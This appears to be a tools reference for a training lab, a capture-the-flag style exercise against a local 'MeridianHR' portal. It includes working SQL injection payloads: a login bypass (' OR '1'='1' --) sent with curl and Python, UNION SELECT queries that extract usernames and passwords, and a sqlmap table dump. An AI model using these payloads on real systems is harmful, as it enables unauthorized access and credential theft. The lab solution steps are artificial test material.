# Tools — Lab 1 (MeridianHR Portal)

Real-world tools used in professional web application penetration testing engagements.

---

## Browser Developer Tools

**Relevance:** Inspect login POST body, view session cookies, monitor network requests to identify vulnerable API endpoints.  
**Use:** `F12` → Network tab → Preserve Log → submit the login form → inspect XHR requests.

---

## Burp Suite (Community or Professional)

**Relevance:** Intercept and modify HTTP requests in real time. Replay and fuzz the login body and payslip `ref` parameter.  
**Use:**
1. Configure browser to proxy through `127.0.0.1:8080`
2. Capture login POST → send to Repeater → modify `username` field
3. Capture payslips GET → send to Repeater → inject into `ref` query parameter
4. Use Intruder with a payload list for automated UNION column-count enumeration

---

## curl

**Relevance:** Script the authentication and query chain from the command line.

```bash
# Layer 1: bypass login
curl -c cookies.txt -s -X POST http://localhost:8081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"x"}'

# Layer 2: UNION extraction (URL-encode the payload first)
curl -b cookies.txt -s \
  "http://localhost:8081/api/payslips?ref=NONE%27%20UNION%20SELECT%20username%2Cpassword%2Crole%2Cemployee_id%2Cemail%20FROM%20employees--"
```

---

## sqlmap

**Relevance:** Automated injection detection and exploitation. Works with the payslip endpoint once a session cookie is obtained.

```bash
# Obtain a session first via curl (Layer 1), then run:
sqlmap -u "http://localhost:8081/api/payslips?ref=MCG-00142" \
  --cookie="connect.sid=PASTE_COOKIE_VALUE_HERE" \
  --dbms=sqlite \
  --technique=U \
  -T employees --dump \
  --batch --level=3
```

---

## Python (requests)

**Relevance:** Combine authentication and extraction into a single script.

```python
import requests, json

s = requests.Session()
s.post("http://localhost:8081/api/auth/login",
       json={"username": "' OR '1'='1' --", "password": "x"})

payload = "NONE' UNION SELECT username,password,role,employee_id,email FROM employees--"
r = s.get("http://localhost:8081/api/payslips", params={"ref": payload})
for row in r.json().get("payslips", []):
    print(row)
```

---

## Postman

**Relevance:** GUI alternative to curl. Useful for iterating payloads in the login body and visualising structured JSON responses.

---

## jq

**Relevance:** Extract specific fields from JSON API responses without manual parsing.

```bash
curl -b cookies.txt -s "http://localhost:8081/api/payslips?ref=NONE'..." | \
  jq '.payslips[] | {user: .period, pass: .gross_salary}'
```

---

## SQLite CLI

**Relevance:** Lab administrator tool — inspect DB state, confirm FLAG was injected.

```bash
docker exec -it meridianhr sh
sqlite3 /app/data/meridianhr.db
.tables
SELECT username, password, role FROM employees;
SELECT content FROM hr_reports WHERE report_code='HR-2026-003';
```
